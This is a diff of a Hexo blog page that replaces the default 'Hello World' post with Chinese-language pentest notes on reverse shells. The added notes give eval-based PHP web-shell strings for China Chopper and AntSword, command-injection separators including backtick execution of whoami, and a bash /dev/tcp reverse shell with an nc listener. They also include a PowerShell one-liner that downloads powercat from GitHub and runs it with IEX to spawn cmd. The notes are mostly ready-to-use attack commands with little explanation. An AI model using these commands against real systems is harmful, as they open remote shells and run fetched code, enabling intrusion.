@@ -26,7 +26,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="icon-home image-icon" href="javascript:;"></a>
     <div title="播放/暂停" class="icon-play"></div>
-    <h3 class="subtitle">Hello World</h3>
+    <h3 class="subtitle">shell-rebound</h3>
     <div class="social">
         <!--<div class="like-icon">-->
             <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -43,22 +43,53 @@
     <div class="section">
         <div class="article">
     <div class="main">
-        <h1 class="title">Hello World</h1>
+        <h1 class="title">shell-rebound</h1>
         <div class="stuff">
-            <span>十二月 03, 2018</span>
+            <span>一月 20, 2019</span>
             
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/文件上传/">文件上传</a></li></ul>
+
 
         </div>
         <div class="content markdown">
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3><span id="run-server">Run server</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3><span id="generate-static-files">Generate static files</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+            <ul>
+<li>命令执行漏洞<code>eval=($_POST[&#39;eval&#39;])</code></li>
+</ul>
+<p>特点：能直接执行命令，也就直接能菜刀连接。计算器执行任意命令漏洞：一般需要代码审计才能找到</p>
+<ul>
+<li>连接蚁剑得方法：</li>
+</ul>
+<p>在请求信息里添加<code>name=eval;value=1，eval($_POST[1])</code></p>
+<ul>
+<li>菜刀得连接方法：配置项中加入<code>&lt;O&gt;eval=1;eval($_POST[1])&lt;/O&gt;</code></li>
+</ul>
+<ul>
+<li><p>代码执行：</p>
+<p>system()命令</p>
+</li>
+</ul>
+<p>​    举例system(‘ping’.$ip)</p>
+<p>同时执行两条命令：<br>    windows：&amp;、&amp;&amp;、||<br>    linux：；分号、&amp;&amp;、||</p>
+<ul>
+<li>注意：<code>`反引号在linux中可以执行  ping `whoami`</code></li>
+</ul>
+<p>windows中如果容器不是iis的，（tamcat\apache等）权限都比较高，<br>linux中只有tomcat可能是root权限</p>
+<blockquote>
+<p>控制shell的方法：bash -i</p>
+</blockquote>
+<p>受控端：–&gt;<code>bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1</code></p>
+<p>主控端：–&gt; nc中  <code>nc -lnvp40000 开始监听</code></p>
+<blockquote>
+<p>控制windows：powershell反弹</p>
+</blockquote>
+<p>受控端–&gt;：<code>nc -lnvp  9999</code></p>
+<p>主控端–&gt;：<code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 127.0.0.1 -p 9999 -e cmd</code></p>
+<blockquote>
+<p>相关的宝贵资料:</p>
+</blockquote>
+<p><a href="http://www.cnblogs.com/anruy/p/4989161.html" target="_blank" rel="noopener">nginx反向代理</a>，能进行数据的转发</p>
+<p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">linux shell反弹</a></p>
+<p><a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">windows下powershell反弹</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
@@ -81,7 +112,7 @@
     </div>
     
         <div class="side">
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+            
         </div>
     
 </div>
